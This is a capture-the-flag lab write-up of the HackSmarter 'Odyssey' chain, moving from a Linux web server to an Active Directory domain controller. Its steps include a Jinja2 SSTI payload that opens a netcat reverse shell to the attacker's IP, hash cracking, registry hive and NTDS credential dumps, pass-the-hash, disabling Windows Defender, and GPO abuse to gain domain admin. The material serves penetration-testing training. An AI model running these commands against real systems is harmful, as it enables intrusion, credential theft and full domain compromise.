# [HackSmarter.org - Odyssey](https://www.hacksmarter.org/courses/1205dc56-4441-47f0-b7d0-47b2113c43dc/take)

![54187f1c137f6d4f9159186db0506d54.png](/resources/54187f1c137f6d4f9159186db0506d54.png)

## Table of Contents

- [Abstract](#abstract)
- [Scope and Objective](#scope-and-objective)
- [Enumeration](#enumeration)
- [Initial Access on Web-01 via SSTI](#initial-access-on-web-01-via-ssti)
- [Privilege Escalation to root on Web-01 via reuse of SSH private key](#privilege-escalation-to-root-on-web-01-via-reuse-of-ssh-private-key)
- [Obtaining password of ghill_sa via shadow file](#obtaining-password-of-ghill_sa-via-shadow-file)
- [RDP to WKST-01 as ghill_sa](#rdp-to-wkst-01-as-ghill_sa)
- [Backup Operators to local administrator on WKST-01](#backup-operators-to-local-administrator-on-wkst-01)
- [Domain Enumeration](#domain-enumeration)
- [Fixing DNS configuration on WKST-01](#fixing-dns-configuration-on-wkst-01)
- [Adding domain computer for BloodHound collector](#adding-domain-computer-for-bloodhound-collector)
- [Privilege Escalation via Group Policy immediated task](#privilege-escalation-via-group-policy-immediated-task)
- [Whoosh, WinRM is enabled and I forgot](#whoosh-winrm-is-enabled-and-i-forgot)
- [Bonus 1 - RDP to WSKT-01 and DC-01 as Administrator](#bonus-1-rdp-to-wskt-01-and-dc-01-as-administrator)
- [Bonus 2 - Running rusthound from Kali Linux](#bonus-2-running-rusthound-from-kali-linux)

***
## Abstract 
Odyssey is a chained labs combining with 1 Linux web server, 1 Windows Workstaion and 1 Windows Active Directory server where Windows Defender is enabled on both of Windows machine, our job is to have administrative access level on all of them to finish off this engagement

Starting with the website hosting on Linux web server, We can exploit jinja2 server-site template injection to gain a foothold as "ghill_sa" user, upon enumeration we can use the SSH private key in `.ssh` directory of this user to connect to the Linux web server as root.

With root privilege, we can now read shadow file where the hash of root and "ghill_sa" are the same which answer why we can reuse SSH private key and by cracking this hash, we will obtain a password to RDP into Windows workstation next.

"ghill_sa" is a member of "Backup Operators" group on the workstation where we can extract secret from registry hives and gain access to the workstation as local administrator user.

The hash extracted from registry hives also have valid hash for domain user where we can create group policy immediate task to add any user to local administrator group and completely compromise the domain controller

## Scope and Objective
You are a member of the Hack Smarter Red Team and have been assigned to perform a black-box penetration test against a client's critical infrastructure. There are three machines in scope: one Linux web server and two Windows enterprise hosts.

The client’s environment is currently in a degraded state due to ongoing migration efforts; the Domain Controllers are experiencing synchronization failures. Consequently, standard automated LDAP enumeration tools (such as BloodHound) are expected to fail or return unreliable data. The client wants to assess if an attacker can thrive in this "broken" environment where standard administrative tools are malfunctioning.

**Note From The Author**
Odyssey was built off a recent engagement that I had where the DC's were not syncing correctly. This caused a lot of problems during the engagement. We also had to go through a proxy, which made tools like LDAP very hard to use. Your normal tools may fail... can you think outside the box?

## Enumeration

I will start with rustscan since it is faster than nmap and VPN connection can tolerate this much of traffic unlike HTB. (I could not use rustscan could not be used on HTB) and we can see that there is only port 5000 which is a default port when running flash application using python
```
rustscan -a Web-01 -- -A
```
![82b9c72675783a684db7df6bbcddd7a0.png](/resources/82b9c72675783a684db7df6bbcddd7a0.png)
![19e62c585b59f7a8b9286746338b51cd.png](/resources/19e62c585b59f7a8b9286746338b51cd.png)

Interestingly, there are SMB and RDP running on Workstation and it appears that the domain of our target is "hsm.local", the certificate also leak machine name that indicates that HackSmarter using EC2 instance to host their machine

```
rustscan -a WKST-01 -- -A
```
![c508c029b18c7e0b45425854d8872890.png](/resources/c508c029b18c7e0b45425854d8872890.png)
![0cfcd9dcf7de56d09450c236a8f0a59e.png](/resources/0cfcd9dcf7de56d09450c236a8f0a59e.png)

The domain controller is running so many ports as it should and both remote protocol ports such as WinRM and RDP are opened so if we could probably use them to get foothold on the domain controller

```
rustscan -a DC-01 -- -A
```
![9ff7f0e44710c33e906dbb3df12a185e.png](/resources/9ff7f0e44710c33e906dbb3df12a185e.png)
![b4f3af0f96d6c5e9c0cce3be957c0066.png](/resources/b4f3af0f96d6c5e9c0cce3be957c0066.png)

Upon visiting the website on port 5000 of Web-01, I notice user input box and the word "Template" make me think about Jinja2 SSTI

![28edb082e3e546e8813cce8939bb70a8.png](/resources/28edb082e3e546e8813cce8939bb70a8.png)

## Initial Access on Web-01 via SSTI

I simply test my hypothesis with `{{25*25}}` payload and we can see that it return with 625 which mean we have our SSTI on this website!

![2ed9eea4718df2f65444d6037551ab2a.png](/resources/2ed9eea4718df2f65444d6037551ab2a.png)

To find another payload, I visit [PayLoadsAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md) github repo and grab more payload to determine the template is using and my first payload is `{{7*'7'}}` to determine if its really Jinja2 and turn out it is as it return with 7777777 (print '7' character seven times)

![11b4fdc83f3f7a748a72d631163fad40.png](/resources/11b4fdc83f3f7a748a72d631163fad40.png)

I can now use jinja2 SSTI specific payload to run command and we can see that the "ghill_sa" user is running this python web application

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
![d4fa58baf15c179e5e240d51ba2e9547.png](/resources/d4fa58baf15c179e5e240d51ba2e9547.png)

When it comes to Linux, Penelope do a pretty great job to upgrade to fully interactive TTY shell so I will use it as my listener

```
penelope
```

I will use simple busybox with netcat to connect back to my listener and now we have our access on Web-01

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 10.200.24.243 4444 -e /bin/bash').read() }}
```
![554893a9b34eccc5961493ff63c81acf.png](/resources/554893a9b34eccc5961493ff63c81acf.png)

There is SSH private key inside `.ssh` directory and according to this command, we could use this to connect to Web-01 via SSH

![a002f4a5bf32f885affe8e683b60a313.png](/resources/a002f4a5bf32f885affe8e683b60a313.png)

## Privilege Escalation to root on Web-01 via reuse of SSH private key

I will download the SSH private key to my machine first

![f5c517a0acbcce3d39532ac70686c637.png](/resources/f5c517a0acbcce3d39532ac70686c637.png)

But then, I tried to connect to Web-01 as "ghill_sa" but It does not accept it so I tried with another user on the machine and turn out this private key can also used to login to Web-01 as root

```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i ghill_id_ed25519 root@Web-01
```
![4d69ccfa831f2026e19c9d8e3f2a8b5d.png](/resources/4d69ccfa831f2026e19c9d8e3f2a8b5d.png)

## Obtaining password of ghill_sa via shadow file

I tried to look for keytab file but there is none, same with database so I will get the hash from shadow file and try to check it, one thing I noticed right away is the same hash between root and ghill_sa user which mean both are technically the same user since they are using the same password? and thats also explain why we can use SSH private key found in `.ssh` folder on ghill_sa user to connect to Web-01 as root

![a6a574fd55adde746a5c3f794b31753a.png](/resources/a6a574fd55adde746a5c3f794b31753a.png)

To cracking this hash, you might need to use the Power of GPU since It took me like hour and a half to successfully cracked it and now we have password of "ghill_sa" user to try login to the domain and workstation

```
hashcat '$6$Zr5DnQ61/ut9zkn9$frvbMJHQy2sV9i4sbjEHrHFn7M5QP9H8Ud.gVZN1cPzge75HtskzOdbymTJMLSZgLEPbTSeshCX46.5MvxLLB0' /usr/share/wordlists/rockyou.txt
```
![43de72ef86e3922f05a3c3a86f7f2aee.png](/resources/43de72ef86e3922f05a3c3a86f7f2aee.png)

Although this set of credential can not authenticated to the domain but it can be used to authenticate to the workstation (using `--local-auth` flag) and we can see that we can use this credential to access "Share" which is a non-standard share on this workstation

![b3f17342f1b752c0cfdbf96f98516fb9.png](/resources/b3f17342f1b752c0cfdbf96f98516fb9.png)

## RDP to WKST-01 as ghill_sa

There are a lot of file inside this share so I will download them all

![b23e23a2e1d8dc4a7fec5fa384319f40.png](/resources/b23e23a2e1d8dc4a7fec5fa384319f40.png)

```
recurse on
prompt off
mget *
```
![bd72b7add7119d9afc7b6eca72bc9478.png](/resources/bd72b7add7119d9afc7b6eca72bc9478.png)

We will have a bunch of username and passwords here so we can create a wordlist and spray them later (spoiler alert: we don't need to)

![9dfb192458748a49b00f141bbacbe6f1.png](/resources/9dfb192458748a49b00f141bbacbe6f1.png)
![186a2ee629e311e1d3ee0788e4353d33.png](/resources/186a2ee629e311e1d3ee0788e4353d33.png)

Since RDP port is opened on the workstation, I use [RDPChecker](https://github.com/Hypnoze57/RDPChecker) script to check if we have access to this workstation via RDP and look like we can land our foothold using RDP

```
python ~/Script/RDPChecker.py -u 'ghill_sa' -p 'P@ssw0rd!' WKST-01
```
![61503a8cbbc556c8c2b0d2410cfa676a.png](/resources/61503a8cbbc556c8c2b0d2410cfa676a.png)

We can use xfreerdp to get access to the workstation and begin our enumerate via GUI

```
xfreerdp /u:'ghill_sa' /p:'P@ssw0rd!' /v:WKST-01 /cert-ignore /dynamic-resolution +clipboard
```
![20f2201403966cb162176293232fc0f4.png](/resources/20f2201403966cb162176293232fc0f4.png)

## Backup Operators to local administrator on WKST-01

Upon opening the shell, I can see that "ghill_sa" user on this workstation is a member of "Backup Operators" and we need to open a new shell "as administrator" to make use of both SeRestorePrivilege and SeBackupPrivilege 

![7489ad157aa4085c903feab372c1fbee.png](/resources/7489ad157aa4085c903feab372c1fbee.png)

One thing to mention is, if you might remember that NetExec have "backup_operator" module but it could not be used. why? because this module was scripted to use on the domain controller. it will save 3 registry hives to SYSVOL so if you can create a new module to make it usable by save them to "Share" folder then feel free to do so

![eb70d1289c1c72200ca64d13fbb91d10.png](/resources/eb70d1289c1c72200ca64d13fbb91d10.png)

After I run PowerShell as "Administrator", I can now try to create a backup of 3 registry hives by my own

![02d25f632852b076d6402dfb9fba922f.png](/resources/02d25f632852b076d6402dfb9fba922f.png)

But once we do that, we could not really save SECURITY hive. so we need to use other method here

![371342c217b39b002aad668b57fca7df.png](/resources/371342c217b39b002aad668b57fca7df.png)

We can use reg.py from impacket toolkit to remotely save these registry hives to specific location on the workstation which I will save it to Share folder which we can then retrieve with SMB client later

```
impacket-reg ghill_sa:'P@ssw0rd!'@WKST-01 backup -o 'C:\Share'
```
![4fe1a41403ba3061671e5ff8a93485ea.png](/resources/4fe1a41403ba3061671e5ff8a93485ea.png)

My smbclient could not retrieve large file (17M is already large here) so I will need to use more realiable method to get it

![b0e547f260a328be60ddc9a2a28b9fd4.png](/resources/b0e547f260a328be60ddc9a2a28b9fd4.png)

And that method is to use `smbget` instead

```
rm SYSTEM.save
smbget -U 'ghill_sa%P@ssw0rd!' smb://WKST-01/Share/SYSTEM.save 
```
![e8aa81b823713bd0564c436c75d501e9.png](/resources/e8aa81b823713bd0564c436c75d501e9.png)

With all 3 hives successfully retrieved, we can use secretdump.py from Impacket to extract secrets from them but which hashes we can use?

```
impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save local 
```
![52c0bc35a7aeb3bf35173effa9b17a89.png](/resources/52c0bc35a7aeb3bf35173effa9b17a89.png)

Going back to the RDP session again, we can run `net localgroup administrators` command to check member of local administrator group which we can see that beside Administrator which is default, we also have "bbarkinson" as a member of this group as well

![c8880dd439447bdadc25a2ce23a838f1.png](/resources/c8880dd439447bdadc25a2ce23a838f1.png)

Both hash can be used so now we could use smbclient to connect to `C$` share and get the flag but I want more than that, I want to have interactive shell or RDP session as Admin on this workstation (if you took offsec exam, you may know this feeling)

![4076b5e8ec6c4db49fa82a84e25c8115.png](/resources/4076b5e8ec6c4db49fa82a84e25c8115.png)

As we know that Windows Defender is running on this machine, we could not use psexec or any impacket tool to get interactive shell

![6f3ad9dd17c9224d479fe62ba98d37c1.png](/resources/6f3ad9dd17c9224d479fe62ba98d37c1.png)
![3222a87f637ae96bcb362f72698e3872.png](/resources/3222a87f637ae96bcb362f72698e3872.png)

RDPing into the machine also have account restriction enabled so we need to add ghill_sa user to local admin group or use reg.py from impacket to modify registry key responsible for this account restriction

![fff048d5a37a42df6a12e9786bdd9442.png](/resources/fff048d5a37a42df6a12e9786bdd9442.png)

I tried to add "ghill_sa" to local admin first by running `net localgroups administrators ghill_sa /add` via NetExec which Windows Defender will detect it as it will execute via wmiexec method

I remember what I did in NorthBridge System, I will use `--no-output` to suppress output and use PowerShell variant to add member to local administrators group and it works like a charm

```
uv run nxc smb WKST-01 -u 'Administrator' -H d5cad8a9782b2879bf316f56936f1e36 --local-auth -X "Add-LocalGroupMember -Group Administrators -Member ghill_sa" --no-output
```
![59d0a8a004fb34045461563cd6c9c037.png](/resources/59d0a8a004fb34045461563cd6c9c037.png)

We can now loot a flag located on the desktop of administrator user on our RDP session 

![8d1e89d5538a675fc04b55d107c11f81.png](/resources/8d1e89d5538a675fc04b55d107c11f81.png)
![3996cb7c8d2dd85aef7ebe3916c257b9.png](/resources/3996cb7c8d2dd85aef7ebe3916c257b9.png)

## Domain Enumeration

By using the hash of "bbarkinson" user that we extracted from workstation, we can now enumerate the domain as well. this probably because this user use the same password on both workstation and the domain

```
uv run nxc smb DC-01 -u 'bbarkinson' -H 53c3709ae3d9f4428a230db81361ffbc
```
![076df10af62ca7d7107e936438374e22.png](/resources/076df10af62ca7d7107e936438374e22.png)

Nothing too interesting on the share since there is no non-standard share here

![7a239c5c554865e573dcb68624f8ce57.png](/resources/7a239c5c554865e573dcb68624f8ce57.png)

I will also pull a valid domain user list to a new text file first so if I obtained a new hash or a password then I can only spray on the valid domain user but look like "bbarkinson" user, there are only 3 built-in user on the domain including Administrator user
 
```
uv run nxc ldap DC-01 -u 'bbarkinson' -H 53c3709ae3d9f4428a230db81361ffbc --users-export user.txt
```
![b0e6f8d65b925099a881e31268b3e9a9.png](/resources/b0e6f8d65b925099a881e31268b3e9a9.png)

## Fixing DNS configuration on WKST-01

I will try to use SharpHound on the workstation as it might join the domain but we can see that it could not resolve the domain and the hostname of domain controller as well, this is already mentioned on the scope that "Domain Controllers are experiencing synchronization failures" so we will probably need to fix it to be able to enumerate domain controller from workstation

![ddd3eff2d51b01e32dc3573a1537a8e8.png
](/resources/ddd3eff2d51b01e32dc3573a1537a8e8.png)

With administrator privilege on workstation, we can now add the IP address of the domain controller as DNS server address and apply it

![e7716a3c1a491a9e1957a169a543b683.png](/resources/e7716a3c1a491a9e1957a169a543b683.png)
![eab995027454e19dd3ab87eda6862d66.png](/resources/eab995027454e19dd3ab87eda6862d66.png)

In a few moment, we should be able to reach the domain controller from this workstation 

![448697518b210f4adb17009cc9bee285.png](/resources/448697518b210f4adb17009cc9bee285.png)

I will disable Windows Defender real time monitoring and then upload SharpHound via smbclient but as we remember that "ghill_sa" is not a member of the domain and we do not have cleartext password of "bbarkinson" as well

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

![7ba9e090cd5723facb06e2ea233a3308.png](/resources/7ba9e090cd5723facb06e2ea233a3308.png)

## Adding domain computer for BloodHound collector

We can create a new machine account on the domain controller since we have valid domain user and by default, Machine Account Quota on any domain is set to 10 so any user can create up to 10 machine account on the domain

```
uv run nxc ldap DC-01 -u 'bbarkinson' -H 53c3709ae3d9f4428a230db81361ffbc -M maq
```
![5180c034e47aed64b9d28d739fa9d0c4.png](/resources/5180c034e47aed64b9d28d739fa9d0c4.png)

We can either use bloodyAD, addcomputer.py from impacket or NetExec to create a new machine account and now we have username and password for our SharpHound

```
uv run nxc smb DC-01 -u 'bbarkinson' -H 53c3709ae3d9f4428a230db81361ffbc -M add-computer -o NAME="backup" PASSWORD='password123'
```
![20cf8935ecee03607b1f30bb3b4778cb.png](/resources/20cf8935ecee03607b1f30bb3b4778cb.png)

Now we can run our SharpHound by suppling username and password of the machine account

```
.\SharpHound.exe -c all -d hsm.local --domaincontroller dc01.hsm.local --zipfilename hsm_local --ldapusername 'backup$' --ldappassword 'password123'
```
![209145821b584364a3dba7ed1d7db581.png](/resources/209145821b584364a3dba7ed1d7db581.png)

## Privilege Escalation via Group Policy immediated task

Bloodhound result reveals that "bbarkinson" user has "GenericWrite" over "Finance Policy" group policy object which is link to the domain controller. what this mean is we can modify the domain controller using tool like [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) to create immediate task and add "bbarkinson" user or our domain machine account to local administrator group

![22a08984efc7e2b611353976d203cc20.png](/resources/22a08984efc7e2b611353976d203cc20.png)

To use [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse), we need to specify GPO ID which we can get it from either Gpopath or first CN under Distinguished Name

![315213b13bd0bc0e62cb0d2b69003206.png](/resources/315213b13bd0bc0e62cb0d2b69003206.png)

I will add my "backup$" computer machine to local administrator group on the domain controller and we will need to wait like 5 - 30 minutes for GPO to apply and run the task and by then we will have administrative access to the domain controller 

```
python pygpoabuse.py hsm.local/bbarkinson -hashes :53c3709ae3d9f4428a230db81361ffbc -gpo-id 526CDF3A-10B6-4B00-BCFA-36E59DCD71A2 -command 'net localgroup administrators backup$ /add' -f
```
![558c624b6c04a20ce84eac3089d55682.png](/resources/558c624b6c04a20ce84eac3089d55682.png)
![72926721bfe2a1ad912060ac6ed09928.png](/resources/72926721bfe2a1ad912060ac6ed09928.png)

We can now get more hash by dumping hash in ntds.dit file over SMB via `--ntds` flag

```
uv run nxc smb DC-01 -u 'backup$' -p password123 --ntds
```
![ee53dfc4a40084a9febb3ca5b0fa15a9.png](/resources/ee53dfc4a40084a9febb3ca5b0fa15a9.png)

Now I will disable Windows Defender with the same trick used on Workstation

```
uv run nxc smb DC-01 -u 'administrator' -H '20f4d4038a64f83862c865c3d5ea2629' -X 'Set-MpPreference -DisableRealtimeMonitoring $true' --no-output
```
![8d2ba38b832bce9d20410e75a8ceedbf.png](/resources/8d2ba38b832bce9d20410e75a8ceedbf.png)

And now any impacket tool should work to get ourself into the domain controller as SYSTEM and loot root flag

```
impacket-psexec Administrator@DC-01 -hashes :20f4d4038a64f83862c865c3d5ea2629
```
![54eaf8ed5d406a896c5414727eded213.png](/resources/54eaf8ed5d406a896c5414727eded213.png)

## Whoosh, WinRM is enabled and I forgot
Yep, I forgot that WinRM is enable so we can use evil-winrm to access the domain controller without bothering with Windows Defender at all

```
evil-winrm-py -i DC-01 -u 'administrator' -H '20f4d4038a64f83862c865c3d5ea2629'
```
![36883870274f048a277f3cea5fa85266.png](/resources/36883870274f048a277f3cea5fa85266.png)

And we can even land our foothold on it with "bbarkinson" as well

![0be6ef0f6d40ccd6156475b97bcbe302.png](/resources/0be6ef0f6d40ccd6156475b97bcbe302.png)

## Bonus 1 - RDP to WSKT-01 and DC-01 as Administrator

If we want to access to workstation and domain controller as Administrator user, we can use reg.py from impacket toolkit to set "DisableRestrictedAdmin" registry key to 0

```
impacket-reg -hashes :d5cad8a9782b2879bf316f56936f1e36 'EC2AMAZ-NS87CNK\Administrator@WKST-01' add -keyName HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -v DisableRestrictedAdmin -vt REG_DWORD -vd '0'
```
![ca82d25d1c6be08c16152063f6a3ceb2.png](/resources/ca82d25d1c6be08c16152063f6a3ceb2.png)

```
xfreerdp /u:'administrator' /pth:'d5cad8a9782b2879bf316f56936f1e36' /v:WKST-01 /cert-ignore /dynamic-resolution +clipboard
```
![92f37d447b4dc5bb993c76db1323545d.png](/resources/92f37d447b4dc5bb993c76db1323545d.png)

The same could also by applied to the domain controller as well!

![100a2c0a9f700ad651213c4b5a192631.png](/resources/100a2c0a9f700ad651213c4b5a192631.png)
![23e95dc115620ec737e86d55f1e7b350.png](/resources/23e95dc115620ec737e86d55f1e7b350.png)

## Bonus 2 - Running rusthound from Kali Linux

Beside SharpHound, we can also use our machine account to collect domain information via rusthound as well, first we will need to create a new kerberos configuration file and use it first

```
uv run nxc smb DC-01 -u 'bbarkinson' -H 53c3709ae3d9f4428a230db81361ffbc --generate-krb5-file krb5conf2
export KRB5_CONFIG=krb5conf2
```
![4b5068115d408024d65ea0d2b0ef65d0.png](/resources/4b5068115d408024d65ea0d2b0ef65d0.png)

Then we can use `kinit` command to request TGT of this account and now we should be able to interact with the domain using kerberos authentication

```
kinit 'backup$'@HSM.LOCAL
```
![710e009236b21a32a1c010bd92523ed1.png](/resources/710e009236b21a32a1c010bd92523ed1.png)

Now our rusthound can happily run without error out

```
rusthound-ce --domain hsm.local -k -f dc01.hsm.local -z
```
![e4e7ae594b0d4a4bccd580c47f263111.png](/resources/e4e7ae594b0d4a4bccd580c47f263111.png)

And we are done!

***
